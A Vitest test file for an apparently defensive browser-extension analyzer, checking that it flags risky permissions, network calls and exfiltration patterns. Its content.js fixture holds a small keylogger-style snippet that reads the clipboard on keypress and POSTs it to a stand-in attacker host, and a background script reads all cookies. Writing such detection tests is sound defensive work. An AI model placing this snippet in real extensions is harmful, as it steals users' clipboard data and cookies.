import { describe, it, expect } from 'vitest';
import { analyzeExtension } from '@/lib/analyzer';

describe('XRay Analyzer Integration', () => {
  const sampleManifest = {
    manifest_version: 3,
    name: 'Test Extension',
    version: '1.0.0',
    permissions: ['storage', 'tabs', 'cookies'],
    host_permissions: ['*://*.example.com/*'],
    background: { service_worker: 'background.js' },
    content_scripts: [
      {
        matches: ['<all_urls>'],
        js: ['content.js'],
      },
    ],
  };

  const sampleFiles = [
    {
      path: 'manifest.json',
      content: JSON.stringify(sampleManifest),
      size: 500,
    },
    {
      path: 'background.js',
      content: `
        fetch('https://api.example.com/data');
        chrome.cookies.getAll({}, function(cookies) {
          console.log(cookies);
        });
      `,
      size: 200,
    },
    {
      path: 'content.js',
      content: `
        document.addEventListener('keydown', function(e) {
          navigator.clipboard.readText().then(text => {
            fetch('https://evil.example.com/exfil', { method: 'POST', body: text });
          });
        });
      `,
      size: 300,
    },
  ];

  it('should return a complete analysis result', () => {
    const result = analyzeExtension(sampleManifest, sampleFiles, 'test-extension.zip', 1000);

    expect(result.fileName).toBe('test-extension.zip');
    expect(result.extensionName).toBe('Test Extension');
    expect(result.version).toBe('1.0.0');
    expect(result.manifestVersion).toBe(3);
    expect(result.overallGrade).toBeTruthy();
    expect(result.gradeBreakdown).toBeTruthy();
    expect(result.permissions).toHaveLength(4); // 3 permissions + 1 host permission
    expect(result.networkCalls.length).toBeGreaterThan(0);
    expect(result.contentScripts).toHaveLength(1);
    expect(result.exfilFindings.length).toBeGreaterThan(0);
    expect(result.vulnerabilities.length).toBeGreaterThanOrEqual(0);
    expect(result.files).toHaveLength(3);
  });

  it('should detect <all_urls> in content scripts', () => {
    const result = analyzeExtension(sampleManifest, sampleFiles, 'test.zip', 1000);
    expect(result.contentScripts[0].riskFlags).toContain('all-urls');
  });

  it('should detect network calls', () => {
    const result = analyzeExtension(sampleManifest, sampleFiles, 'test.zip', 1000);
    expect(result.networkCalls.some(nc => nc.url.includes('api.example.com'))).toBe(true);
    expect(result.networkCalls.some(nc => nc.url.includes('evil.example.com'))).toBe(true);
  });

  it('should detect exfiltration patterns', () => {
    const result = analyzeExtension(sampleManifest, sampleFiles, 'test.zip', 1000);
    expect(result.exfilFindings.some(f => f.type === 'keylogging')).toBe(true);
    expect(result.exfilFindings.some(f => f.type === 'clipboard-access')).toBe(true);
    expect(result.exfilFindings.some(f => f.type === 'external-fetch')).toBe(true);
  });

  it('should calculate manifest grade', () => {
    const result = analyzeExtension(sampleManifest, sampleFiles, 'test.zip', 1000);
    expect(result.manifestCheck.isV3).toBe(true);
    expect(result.manifestCheck.grade).toBe('A');
  });

  it('should handle empty permissions', () => {
    const minimalManifest = { manifest_version: 3, name: 'Minimal' };
    const result = analyzeExtension(minimalManifest, [], 'minimal.zip', 100);
    expect(result.permissions).toEqual([]);
    expect(result.gradeBreakdown.permissions).toBe('A');
  });

  it('should handle manifest v2', () => {
    const v2Manifest = {
      manifest_version: 2,
      name: 'Old Extension',
      permissions: ['tabs'],
      browser_action: { default_popup: 'popup.html' },
      background: { scripts: ['bg.js'], persistent: true },
    };
    const result = analyzeExtension(v2Manifest, [], 'old.zip', 100);
    expect(result.manifestCheck.isV3).toBe(false);
    expect(result.manifestCheck.migrationBlocked).toBe(true);
  });
});
